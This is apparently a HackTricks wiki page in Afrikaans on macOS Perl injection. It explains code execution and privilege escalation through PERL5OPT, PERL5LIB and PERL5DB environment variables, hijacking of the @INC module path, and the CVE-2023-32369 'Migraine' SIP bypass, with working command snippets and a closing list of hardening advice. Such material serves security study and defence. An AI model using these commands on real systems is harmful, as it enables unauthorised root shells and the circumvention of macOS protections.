# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

Deur die env variable **`PERL5OPT`** is dit moontlik om **Perl** arbitrêre commands te laat uitvoer wanneer die interpreter begin (selfs **voor** die eerste reël van die target script geparseer word).
Skep byvoorbeeld hierdie script:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Voer nou die **env variable** uit en voer die **perl**-script uit:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Nog 'n opsie is om 'n Perl-module te skep (bv. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
En gebruik dan die env-veranderlikes sodat die module outomaties opgespoor en gelaai word:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Ander interessante omgewingsveranderlikes

* **`PERL5DB`** – wanneer die interpreter met die **`-d`** (debugger)-vlag begin word, word die inhoud van `PERL5DB` as Perl-kode *binne* die debugger-konteks uitgevoer.
As jy beide die omgewing **en** die command-line-vlae van ’n bevoorregte Perl-proses kan beïnvloed, kan jy iets soos die volgende doen:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – op Windows beheer hierdie veranderlike watter shell executable Perl sal gebruik wanneer dit ’n shell moet spawn. Dit word hier slegs vir volledigheid genoem, aangesien dit nie op macOS relevant is nie.

Hoewel **`PERL5DB`** die **`-d`**-switch vereis, is dit algemeen om maintenance- of installer-scripts te vind wat as *root* met hierdie vlag geaktiveer uitgevoer word vir verbose troubleshooting, wat die veranderlike ’n geldige escalation vector maak.

## Via dependencies (@INC abuse)

Dit is moontlik om die include path te lys waarna Perl sal soek (**`@INC`**) deur die volgende uit te voer:
```bash
perl -e 'print join("\n", @INC)'
```
Tipiese uitvoer op macOS 13/14 lyk soos:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Sommige van die teruggekeerde vouers bestaan nie eens nie, maar **`/Library/Perl/5.30`** bestaan wel, word *nie* deur SIP beskerm nie en is *voor* die SIP-beskermde vouers. Daarom, indien jy as *root* kan skryf, kan jy ’n kwaadwillige module (bv. `File/Basename.pm`) plaas wat *by voorkeur* gelaai sal word deur enige bevoorregte script wat daardie module invoer.

> [!WARNING]
> Jy benodig steeds **root** om binne `/Library/Perl` te skryf, en macOS sal ’n **TCC**-prompt vertoon wat vra vir *Full Disk Access* vir die proses wat die skryfbewerking uitvoer.

Byvoorbeeld, indien ’n script **`use File::Basename;`** invoer, sou dit moontlik wees om `/Library/Perl/5.30/File/Basename.pm` te skep wat kode bevat wat deur die aanvaller beheer word.

## SIP-omseiling via Migration Assistant (CVE-2023-32369 “Migraine”)

In Mei 2023 het Microsoft **CVE-2023-32369**, met die bynaam **Migraine**, bekend gemaak—’n post-exploitation-tegniek wat ’n *root*-aanvaller toelaat om System Integrity Protection (SIP) volledig te **omseil**.
Die kwesbare komponent is **`systemmigrationd`**, ’n daemon met die **`com.apple.rootless.install.heritable`**-entitlement. Enige child process wat deur hierdie daemon voortgebring word, erf die entitlement en loop dus **buite** SIP-beperkings.<sup>[[1]](#references)</sup>

Een van die children wat deur die navorsers geïdentifiseer is, is die Apple-ondertekende interpreter:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Omdat Perl `PERL5OPT` respekteer (en Bash `BASH_ENV` respekteer), is dit voldoende om die daemon se *omgewing* te vergiftig om arbitrêre uitvoering in ’n konteks sonder SIP te verkry:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Wanneer `migrateLocalKDC` loop, begin `/usr/bin/perl` met die kwaadwillige `PERL5OPT` en voer `/private/tmp/migraine.sh` uit *voordat SIP weer geaktiveer word*. Vanuit daardie script kan jy byvoorbeeld 'n payload binne **`/System/Library/LaunchDaemons`** kopieer of die `com.apple.rootless` uitgebreide kenmerk toewys om 'n lêer **onverwyderbaar** te maak.

Apple het die probleem in macOS **Ventura 13.4**, **Monterey 12.6.6** en **Big Sur 11.7.7** reggestel, maar ouer of nie-gepatchte stelsels bly kwesbaar.<sup>[[1]](#references)</sup>

## Aanbevelings vir hardening

1. **Maak gevaarlike veranderlikes skoon** – bevoorregte launchdaemons of cron-take behoort met 'n skoon omgewing te begin (`launchctl unsetenv PERL5OPT`, `env -i`, ens.).
2. **Vermy om interpreters as root te laat loop** tensy dit streng noodsaaklik is. Gebruik gekompileerde binaries of verlaag privileges vroegtydig.
3. **Voorsien scripts van `-T` (taint mode)** sodat Perl `PERL5OPT` en ander onveilige skakelaars ignoreer wanneer taint checking geaktiveer is.
4. **Hou macOS op datum** – “Migraine” is volledig gepatch in huidige vrystellings.

## Verwysings

- [1] [Microsoft Security Blog – Nuwe macOS-kwesbaarheid, Migraine, kan System Integrity Protection omseil (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Deel 1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
